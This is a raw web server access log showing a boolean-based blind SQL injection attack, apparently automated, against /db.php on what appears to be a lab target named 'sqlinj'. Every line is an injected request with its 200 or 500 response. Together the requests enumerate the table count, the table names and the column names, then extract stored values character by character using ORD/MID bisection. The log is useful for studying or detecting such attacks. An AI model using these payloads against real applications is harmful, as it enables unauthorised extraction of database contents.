500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a),1,1))>51 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a),1,1))>48 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a),1,1))>49 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a),2,1))>51 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a),2,1))>48 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a),2,1))>1 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),1,1))>64 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),1,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),1,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),1,1))>120 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),1,1))>116 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),1,1))>114 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),1,1))>115 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),2,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),2,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),2,1))>120 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),2,1))>116 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),2,1))>114 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),2,1))>113 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),3,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),3,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),3,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),3,1))>108 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),3,1))>106 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),3,1))>107 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),4,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),4,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),4,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),4,1))>108 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),4,1))>106 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),4,1))>105 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),5,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),5,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),5,1))>104 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),5,1))>108 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),5,1))>110 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),5,1))>109 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),6,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),6,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),6,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),6,1))>108 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),6,1))>106 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),6,1))>105 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),7,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),7,1))>48 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c696e6a LIMIT 0,1),7,1))>1 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a),1,1))=115 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a),1,1))>51 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a),1,1))>48 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a),1,1))>49 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a),1,1))>50 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a),2,1))>51 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a),2,1))>48 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a),2,1))>1 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),1,1))>64 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),1,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),1,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),1,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),1,1))>108 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),1,1))>106 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),1,1))>105 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),2,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),2,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),2,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),2,1))>100 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),2,1))>98 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),2,1))>99 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),3,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),3,1))>48 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 0,1),3,1))>1 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),1,1))>64 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),1,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),1,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),1,1))>120 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),1,1))>116 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),1,1))>118 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),1,1))>117 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),2,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),2,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),2,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),2,1))>100 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),2,1))>98 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),2,1))>97 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),3,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),3,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),3,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),3,1))>108 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),3,1))>106 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),3,1))>107 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),4,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),4,1))>48 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x73716c696e6a AND table_schema=0x73716c696e6a LIMIT 1,1),4,1))>1 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM sqlinj.sqlinj),1,1))>51 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM sqlinj.sqlinj),1,1))>48 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM sqlinj.sqlinj),1,1))>49 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM sqlinj.sqlinj),2,1))>51 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM sqlinj.sqlinj),2,1))>48 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM sqlinj.sqlinj),2,1))>1 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),1,1))>64 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),1,1))>32 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),1,1))>48 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),1,1))>56 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),1,1))>52 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),1,1))>50 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),1,1))>49 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),2,1))>47 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),2,1))>1 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),1,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),1,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),1,1))>80 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),1,1))>88 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),1,1))>84 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),1,1))>82 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),1,1))>83 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),2,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),2,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),2,1))>80 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),2,1))>72 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),2,1))>68 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),2,1))>66 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),2,1))>67 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),3,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),3,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),3,1))>80 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),3,1))>72 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),3,1))>76 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),3,1))>78 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),3,1))>79 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),4,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),4,1))>96 HTTP/1.1
